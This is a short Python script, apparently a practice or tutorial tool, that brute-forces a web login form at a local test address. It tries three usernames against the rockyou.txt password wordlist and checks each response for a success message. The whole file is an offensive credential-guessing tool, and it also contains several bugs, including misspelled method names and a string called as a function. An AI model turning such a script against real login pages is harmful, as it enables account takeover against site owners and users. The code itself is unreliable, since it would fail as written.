import requests

#sys for progress bar
import sys

#identify the target
target = 'http://127.0.0.1:5000'

#list of usernames
usernames = ['admin', 'user', 'test']

#file list of passwords
passwords = '/usr/share/wordlists/rockyou.txt'

#message output after successful login
needle = 'Welcome back!'

#loop for the variable usernames list
for username in usernames:

    #open password file list in read mode as password_list
    with open(passwords, 'r') as passwords_list:

        #enumerate list
        for password in passwords_list:

            #clean password by removing new line in between words
            password = password.strip('\n').encode()
            
            #progress bar
            sys.stdout.write('[X] Attempting user:password -> {}:{}\r'.format(username, password.decode()))

            #return to the start 
            sys.stdout.flush()

            #make the request
            r = requests.post(target, data = {'username': username, 'password': password})

            #check if authentication request was valid
            if needle.encode()in r.content:

                #add new line
                sys.stfout.write('\n')

                #output valid password and user
                sys.stdout.write('\t[>>>>>] Valid password "{}" found for user "{}"!'.format(password.deocde(), username()))

                #found password
                exit()

        #password was not found for the user
        sys.stdout.flush()

        #add new line
        sys.stdout.write('\n')

        #failed username
        sys.stdout.write('\tNo password found for "{}"!').format(username)